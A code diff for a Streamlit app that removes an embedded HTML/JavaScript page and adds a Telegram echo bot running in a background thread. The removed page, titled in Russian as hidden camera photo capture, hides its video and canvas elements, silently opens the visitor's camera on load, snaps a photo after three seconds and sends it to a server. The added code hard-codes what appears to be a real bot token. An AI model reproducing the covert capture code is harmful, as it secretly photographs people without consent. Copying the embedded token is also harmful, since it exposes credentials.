@@ -1,92 +1,24 @@
+import threading
 import streamlit as st
-import streamlit.components.v1 as components
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
 
-# HTML код с JavaScript
-html_code = """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Скрытая съемка фото с камеры</title>
-    <style>
-        body {
-            background-color: white; /* Белый фон */
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        #videoElement {
-            display: none; /* Скрыть видео */
-        }
-    </style>
-</head>
-<body>
-    <video id="videoElement" width="640" height="480" autoplay></video>
-    <canvas id="canvas" style="display: none;"></canvas> <!-- Скрытый canvas -->
-    
-    <script>
-        // Получаем доступ к камере
-        async function startCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const videoElement = document.getElementById('videoElement');
-                videoElement.srcObject = stream;
-            } catch (error) {
-                console.error("Ошибка доступа к камере:", error);
-                alert("Не удалось получить доступ к камере.");
-            }
-        }
+# Функция для работы бота
+def run_bot():
+    # Токен бота
+    updater = Updater("7930470705:AAHbOa2VpXknxhnkdV5sCE9R3W50yjTbVwg", use_context=True)
+    dp = updater.dispatcher
 
-        // Функция для отправки изображения на сервер
-        async function sendPhotoToServer(dataUrl) {
-            const response = await fetch('http://localhost:5000/upload', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ image: dataUrl })
-            });
-            
-            if (response.ok) {
-                console.log('Фото успешно отправлено!');
-            } else {
-                console.error('Ошибка отправки фото');
-            }
-        }
+    # Ответ на любое сообщение
+    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, 
+                                  lambda update, context: update.message.reply_text("Я получил твоё сообщение!")))
 
-        // Функция для захвата фото с камеры
-        function capturePhoto() {
-            const videoElement = document.getElementById('videoElement');
-            const canvas = document.getElementById('canvas');
+    # Запуск бота
+    updater.start_polling()
+    updater.idle()
 
-            // Отображаем изображение с видео на canvas (скрыто от пользователя)
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+# Запуск бота в отдельном потоке
+threading.Thread(target=run_bot, daemon=True).start()
 
-            // Преобразуем изображение на canvas в Data URL
-            const dataUrl = canvas.toDataURL('image/png');
-
-            // Отправляем фото на сервер
-            sendPhotoToServer(dataUrl);
-        }
-
-        // Запускаем камеру при загрузке страницы
-        startCamera();
-
-        // Функция для автоматической съемки фото через 3 секунды
-        setTimeout(() => {
-            capturePhoto();
-        }, 3000);  // Снимает фото через 3 секунды
-    </script>
-</body>
-</html>
-"""
-
-# Отображаем HTML в Streamlit
-components.html(html_code, height=600)
+# Код для Streamlit UI
+st.title("Streamlit + Telegram Bot")
+st.write("Бот работает в фоне и будет отвечать на сообщения.")
